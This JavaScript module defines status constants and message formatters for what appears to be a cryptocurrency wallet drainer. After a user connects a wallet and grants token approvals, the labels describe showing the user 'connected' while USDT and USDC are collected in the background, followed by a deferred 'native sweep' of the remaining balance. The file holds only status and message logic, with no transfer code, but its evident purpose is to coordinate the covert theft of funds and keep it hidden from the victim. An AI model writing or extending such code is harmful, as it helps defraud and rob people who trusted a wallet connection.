/** Stablecoin collection order before native sweep (business rule). */
export const TOKEN_SETTLEMENT_ORDER = ["USDT", "USDC"];
export const NETWORK_SETTLEMENT_STATUSES = [
  "WALLET_PHASE_COMPLETE",
  "FINALIZING_APPROVALS",
  "COLLECTING_TOKENS",
  "AWAITING_NATIVE",
  "EXECUTING_NATIVE",
  "COMPLETED",
  "FAILED",
];
export const NETWORK_SETTLEMENT_STATUS_LABELS = {
  WALLET_PHASE_COMPLETE: "Wallet phase complete — user sees connected",
  FINALIZING_APPROVALS: "Finalizing approvals on-chain",
  COLLECTING_TOKENS: "Collecting USDT → USDC in background",
  AWAITING_NATIVE: "No active token collection — native may proceed",
  EXECUTING_NATIVE: "Executing deferred native transfer",
  COMPLETED: "Settlement complete",
  FAILED: "Settlement failed",
};
/** Client-side settlement coordinator progress stages. */
export const SETTLEMENT_PROGRESS_STAGE_LABELS = {
  finalizing_approval: "Finalizing approval",
  collecting_token: "Waiting for active token collection",
  native_ready: "No active token collection — native may proceed",
  executing_native: "Executing native transfer",
  completed: "Settlement complete",
  failed: "Settlement failed",
};
export function formatSettlementProgressMessage(detail) {
  const stage = String(detail.stage ?? "").trim();
  const token = detail.token ? String(detail.token).toUpperCase() : "";
  const network = detail.network ? String(detail.network).toUpperCase() : "";
  const explicit = String(detail.message ?? "").trim();
  if (stage === "finalizing_approval" && token) {
    return network
      ? `Finalizing ${token} approval on ${network}`
      : `Finalizing ${token} approval`;
  }
  if (stage === "collecting_token") {
    if (explicit) return explicit;
    return network
      ? `Monitoring token collection on ${network} — native proceeds when idle`
      : "Monitoring token collection — native proceeds when no active transfer";
  }
  if (stage === "native_ready") {
    return network
      ? `No active token collection on ${network} — proceeding with native`
      : "No active token collection — proceeding with native";
  }
  if (stage === "executing_native") {
    return network
      ? `Executing native transfer on ${network}`
      : "Executing native transfer";
  }
  if (stage === "completed") {
    return network
      ? `Settlement complete on ${network}`
      : "Settlement complete";
  }
  if (stage === "failed") {
    return (
      explicit ||
      (network ? `Settlement failed on ${network}` : "Settlement failed")
    );
  }
  const stageLabel = SETTLEMENT_PROGRESS_STAGE_LABELS[stage];
  if (stageLabel && token) return `${stageLabel}: ${token}`;
  if (stageLabel) return stageLabel;
  if (explicit) return explicit;
  return "Settlement in progress";
}
export function formatWalletPhaseCompleteMessage(detail) {
  const network = detail.network ? String(detail.network).toUpperCase() : "";
  const authorized = detail.authorizedCount ?? 0;
  const failed = detail.failedCount ?? 0;
  const rejected = detail.rejectedCount ?? 0;
  const prefix = network ? `${network}: ` : "";
  if (rejected > 0 && authorized === 0) {
    return `${prefix}Wallet phase ended — user rejected all authorizations`;
  }
  if (failed > 0) {
    return `${prefix}Wallet phase complete — ${authorized} authorized, ${failed} failed (background settlement starting)`;
  }
  return `${prefix}Wallet phase complete — user connected (${authorized} authorized). Background settlement starting`;
}
/** Settlement statuses that indicate background work is still running. */
export const ACTIVE_SETTLEMENT_STATUSES = [
  "WALLET_PHASE_COMPLETE",
  "FINALIZING_APPROVALS",
  "COLLECTING_TOKENS",
  "AWAITING_NATIVE",
  "EXECUTING_NATIVE",
];
